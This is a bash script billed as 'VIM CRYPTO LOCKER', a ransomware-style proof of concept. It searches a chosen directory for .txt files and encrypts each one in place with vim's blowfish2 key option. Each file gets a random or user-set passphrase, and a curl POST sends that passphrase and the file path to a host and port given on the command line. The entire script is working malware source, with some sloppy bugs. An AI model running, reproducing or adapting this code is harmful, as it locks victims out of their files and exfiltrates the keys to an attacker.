#!/bin/bash
# Kent 'picat' Gruber

# help_menu() provides a help menu
# for this application by echoing the
# available options out to the screen
help_menu() {
  echo -e "VIM CRYPTO LOCKER - What could go wrong?\n
  Typical use case:
  EX: ./vimlocker.sh -H 192.168.1.2 -P 80 -d directory -e reallystrongpassword
  Experimental use case:
  EX: ./vimlocker.sh -H 192.168.1.2 -P 80 -d directory -n

  OPTIONS:
  -H <IP>\tHost ip to send encrpytion information to.
  -P <PORT>\tHost port to send encrpytion information to.
  -e <PASS>\tSet passphrase for file ( one is generated by default ).
  -l <FILE>\tLog application actions to a file ( off by default ).
  -n\t\tGenerate a new passphrase for each file.
  -v\t\tDisplay version.
  -h\t\tDisplay this menu.
  "
}

# Detect vim or vi
if [ -x $(which vim) ]; then
  editor_path=$(which vim)
elif [ -x $(which vi) ]; then
  editor_path=$(which vi)
else
  echo "Error. Neither Vi or Vim are avaialable to decrypt files :("
fi

# If not arguments are provided, then do ahead
# and default to a nice little help menu.
if [ $# -eq 0 ]; then
  help_menu
  exit 1
fi

# Set defaults
host_given=false
port_give=false
passphrase_given=false
directory_given=false
new_each_given=false
log_given=false

# version() provides a simple means of checking
# the version of the application.
function version() {
  echo "Version 1.1"
}

function parseOpts() {
while getopts h,v,n,d:,l:,e:,H:,P:,D: opt; do
  case $opt in
    h) # Help
      help_menu
      exit 0
      ;;
    v) # Version check
      version
      exit 0
      ;;
    H) # Host ip to send information to
      host="$OPTARG"
      host_given=true
      ;;
    P) # Host port to send information to
      port="$OPTARG"
      port_given=true
      ;;
    e) # Set passphrase to use
      passphrase="$OPTARG"
      passphrase_given=true
      ;;
    d) # Directory to encrypt
      directory="$OPTARG"
      directory_given=true
      ;;
    l) # Log file to use
      log="$OPTARG"
      log_given=true
      ;;
    n) # New password each file
      new_each_given=true
      ;;
    \?) # Invalid arg
      echo "Invalid option: -$OPTARG"
      help_menu
      exit 1
      ;;
    :) # Missing arg
      echo "An argument must be specified for -$OPTARG"
      help_menu
      exit 1
      ;;
  esac
done
}

# Parse Arguments
parseOpts "$@"

# Check directory options
if $directory_given == false ; then
  if [ ! -d $directory ]; then
    echo "Error: $directory dosen't seem to be a directory!"
    exit 1
  fi
else
  echo "Error: No directory specified with the -d option!"
  exit 1
fi

# Check host options
if $host_given; then
  echo "[+] Host set to $host"
  if $port_given; then
    echo "[+] Host port set to $port"
  else
    echo "[*] No port set for host connection."
    echo "[*] Setting to 80 as a default."
    port="80"
  fi
fi

# Check passphrase options
if $passphrase_given; then
  echo "[*] Passphrase set to $passphrase"
else
  if $new_each_given; then
    echo "[*] A new passphrase will be generated for each file."
  else
    passphrase=$($RANDOM$RANDOM | md5sum | awk '{print $1}')
    echo "[*] Passphrase set to: $passphrase"
  fi
fi

# Files to encrypt
type_files=( txt )
black_list=$(echo ${type_files[@]} | sed 's/ /|/g' )

# Set encryption type
encryption="blowfish2"
echo "[*] Encryption method set to $encryption"

# Files to iterate through
files=$(find $directory -type f)

# Iterate through files
for file in $files
do
  # Encrypt the files that match the blacklist
  if [[ $file =~ $black_list ]]; then
    if $new_each_given; then
      passphrase=$(echo $RANDOM$RANDOM | md5sum | awk '{print $1}')
    fi
    if $host_given; then
      curl --data "encryption=$encryption&passphrase=$passphrase&file=$file" -X POST http://$host:$port
    fi
    if $log_given; then
      echo "Encryption:'$encryption' Pass:'$passphrase'  File:'$file'" >> $log
    fi
    $editor_path --cmd "set key=$passphrase" --cmd "set cm=$encryption" -c wq $file
    echo "[+] Encryption:$encryption Pass:$passphrase  File:$file"
  fi
done
